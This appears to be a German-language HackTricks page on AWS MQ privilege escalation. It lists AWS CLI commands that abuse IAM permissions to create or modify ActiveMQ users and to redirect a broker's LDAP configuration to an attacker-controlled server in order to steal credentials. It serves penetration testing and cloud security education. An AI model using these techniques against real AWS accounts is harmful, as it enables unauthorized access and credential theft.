# AWS - MQ Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## MQ

Für weitere Informationen zu MQ siehe:

{{#ref}}
../../aws-services/aws-mq-enum.md
{{#endref}}

### `mq:ListBrokers`, `mq:CreateUser`

Mit diesen Berechtigungen kannst du **einen neuen Benutzer in einem ActimeMQ broker erstellen** (dies funktioniert nicht in RabbitMQ):
```bash
aws mq list-brokers
aws mq create-user --broker-id <value> --console-access --password <value> --username <value>
```
**Potentieller Einfluss:** Zugriff auf sensible Informationen beim Navigieren durch ActiveMQ

### `mq:ListBrokers`, `mq:ListUsers`, `mq:UpdateUser`

Mit diesen Berechtigungen können Sie **einen neuen Benutzer in einem ActimeMQ broker erstellen** (dies funktioniert nicht in RabbitMQ):
```bash
aws mq list-brokers
aws mq list-users --broker-id <value>
aws mq update-user --broker-id <value> --console-access --password <value> --username <value>
```
**Mögliche Auswirkungen:** Zugriff auf sensible Informationen beim Navigieren durch **ActiveMQ**

### `mq:ListBrokers`, `mq:UpdateBroker`

Wenn ein Broker **LDAP** zur Autorisierung mit **ActiveMQ** verwendet, ist es möglich, die **Konfiguration** des verwendeten LDAP-Servers auf einen vom Angreifer kontrollierten Server zu **ändern**. Auf diese Weise kann der Angreifer **alle über LDAP gesendeten credentials stehlen**.
```bash
aws mq list-brokers
aws mq update-broker --broker-id <value> --ldap-server-metadata=...
```
Wenn Sie irgendwie die ursprünglichen Credentials finden könnten, die von ActiveMQ verwendet werden, könnten Sie einen MitM durchführen, die Credentials abfangen, sie auf dem ursprünglichen Server verwenden und die Antwort weiterleiten (vielleicht reicht es, die gestohlenen Credentials einfach wiederzuverwenden).

**Mögliche Auswirkung:** ActiveMQ-Credentials stehlen

{{#include ../../../../banners/hacktricks-training.md}}
